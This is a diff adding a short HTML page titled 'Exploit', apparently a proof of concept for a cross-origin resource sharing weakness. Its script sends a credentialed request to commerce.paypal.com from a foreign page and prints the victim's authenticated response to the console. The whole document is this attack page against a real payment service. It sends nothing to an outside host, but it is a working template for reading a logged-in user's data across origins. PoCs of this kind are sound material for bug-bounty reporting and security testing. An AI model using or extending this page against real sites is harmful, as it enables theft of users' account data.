@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit</title>
+</head>
+<body>
+    <script>
+        fetch('https://commerce.paypal.com/', {
+            method: 'GET',
+            credentials: 'include'
+        })
+        .then(response => response.text())
+        .then(data => {
+            console.log(data);
+        })
+        .catch(error => console.error('Error:', error));
+    </script>
+</body>
+</html>
